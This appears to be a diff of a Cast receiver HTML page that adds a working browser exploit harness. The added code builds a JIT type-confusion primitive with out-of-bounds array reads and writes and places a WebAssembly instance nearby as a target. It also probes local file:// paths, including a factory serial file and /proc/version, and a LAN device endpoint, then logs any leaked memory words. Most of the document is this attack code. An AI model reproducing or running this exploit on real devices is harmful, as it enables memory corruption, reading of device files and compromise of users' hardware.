@@ -11,12 +11,13 @@
 <body>
 <div id="out"></div>
 
-<!-- Same reporting channel as the main app: everything is prefixed for the log. -->
+<!-- Reporting channel is the device log, grepped for [clocklab]. -->
 <script src="https://www.gstatic.com/cast/sdk/libs/caf_receiver/v3/cast_receiver_framework.js"></script>
 <script>
 (function () {
   'use strict';
   var TAG = '[clocklab]';
+  var CONFIG = 'lab/config.json';
 
   function emit(line) {
     try { console.log(TAG + ' ' + line); } catch (e) {}
@@ -24,16 +25,9 @@
     if (el) { el.textContent += line + '\n'; }
   }
 
-  // Route upstream print() into the device log, and be loud on failure: a silent
-  // renderer crash is otherwise indistinguishable from a hang.
   window.print = emit;
-  window.onerror = function (msg, src, line) {
-    emit('lab-error ' + msg + ' @' + line);
-    return false;
-  };
-  window.addEventListener('unhandledrejection', function () { emit('lab-reject'); });
+  window.onerror = function (msg, src, line) { emit('lab-error ' + msg + ' @' + line); return false; };
 
-  // The receiver must still start, or the cast session never reaches ready.
   try {
     var ctx = cast.framework.CastReceiverContext.getInstance();
     ctx.addCustomMessageListener('urn:x-cast:com.clock.lab', function (e) {
@@ -41,21 +35,85 @@
     });
     ctx.start();
     emit('lab-receiver-started');
-  } catch (e) {
-    emit('lab-cast-error ' + ((e && e.message) || e));
+  } catch (e) { emit('lab-cast-error ' + ((e && e.message) || e)); }
+
+  // ---- free checks first: a file read may need no memory bug at all ----
+  function tryFetch(url) {
+    return fetch(url, { cache: 'no-store' })
+      .then(function (r) { return r.text().then(function (t) {
+        return 'status=' + r.status + ' len=' + t.length + ' head=' +
+               t.replace(/\s+/g, ' ').slice(0, 40);
+      }); })
+      .catch(function (e) { return 'ERR=' + (e && e.name); });
+  }
+  [['file-factory', 'file:///factory/serial.txt'],
+   ['file-proc', 'file:///proc/version'],
+   ['lan-ip', 'http://192.168.166.193:8008/setup/eureka_info']].forEach(function (pair) {
+    tryFetch(pair[1]).then(function (r) { emit('free ' + pair[0] + ' ' + r); });
+  });
+
+  // ---- one attempt per page load, so JIT feedback is always fresh ----------
+  function hexOf(v) {
+    var buf = new ArrayBuffer(8), d = new Float64Array(buf), u = new Uint32Array(buf);
+    d[0] = v;
+    return u[1].toString(16) + ':' + u[0].toString(16);
+  }
+  function verdictOf(h) {
+    var hi = parseInt(h.split(':')[0], 16);
+    if (hi === 0x40100000) { return 'plain4.0'; }
+    if (hi === 0x7ff80000) { return 'nan'; }
+    if (hi === 0) { return 'zero'; }
+    return 'CANDIDATE';
   }
 
-  emit('lab-boot onerror=armed');
-  emit('lab-start');
-  try {
-    var s = document.createElement('script');
-    s.src = 'lab/poc-sweep.js';
-    s.onload = function () { emit('lab-loaded'); };
-    s.onerror = function () { emit('lab-script-missing'); };
-    document.body.appendChild(s);
-  } catch (e) {
-    emit('lab-threw ' + e.name);
+  function run(cfg) {
+    var code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+    var module = new WebAssembly.Module(code);
+    var instance = new WebAssembly.Instance(module);
+
+    function foo(y) { x = y; }
+    function oobRead() { return [x[20], x[24]]; }
+    function oobWrite(addr) { x[24] = addr; }
+
+    var arr0 = new Array(10); arr0.fill(1); arr0.a = 1;
+    var arr1 = new Array(10); arr1.fill(2); arr1.a = 1;
+    var arr2 = new Array(10); arr2.fill(3); arr2.a = 1;
+    var arr = new Array(30); arr.fill(4); arr.a = 1;
+    var b = new Array(1); b.fill(1);
+    var writeArr = [1.1];
+    x = arr0;
+
+    for (var i = 0; i < cfg.wa; i++) {
+      if (i === cfg.wa - 2) { arr2[0] = 1.1; }
+      foo(arr1);
+    }
+    x[0] = 1.1;
+    for (var i2 = 0; i2 < cfg.wb; i2++) { oobRead(); }
+    for (var i3 = 0; i3 < cfg.wc; i3++) { oobWrite(1.1); }
+    var lenBefore = x.length;
+    if (cfg.retarget) { foo(arr); }
+    b[0] = instance;
+
+    var h20 = 'err', h24 = 'err';
+    try { h20 = hexOf(x[20]); } catch (e) { h20 = 'threw'; }
+    try { h24 = hexOf(x[24]); } catch (e) { h24 = 'threw'; }
+    var v = verdictOf(h20);
+    emit('attempt wa=' + cfg.wa + ' wb=' + cfg.wb + ' wc=' + cfg.wc +
+         ' retarget=' + cfg.retarget + ' lenBefore=' + lenBefore +
+         ' lenAfter=' + (x && x.length) +
+         ' x20=' + h20 + '(' + v + ') x24=' + h24 + ' verdict=' + v);
+    emit('attempt-done');
   }
+
+  emit('lab-boot');
+  fetch(CONFIG + '?t=' + Date.now(), { cache: 'no-store' })
+    .then(function (r) { if (!r.ok) { throw new Error('config ' + r.status); } return r.json(); })
+    .then(function (cfg) {
+      emit('config ' + JSON.stringify(cfg));
+      try { run(cfg); }
+      catch (e) { emit('run-threw ' + e.name + ': ' + e.message); }
+    })
+    .catch(function (e) { emit('config-fail ' + ((e && e.message) || e)); });
 }());
 </script>
 </body>
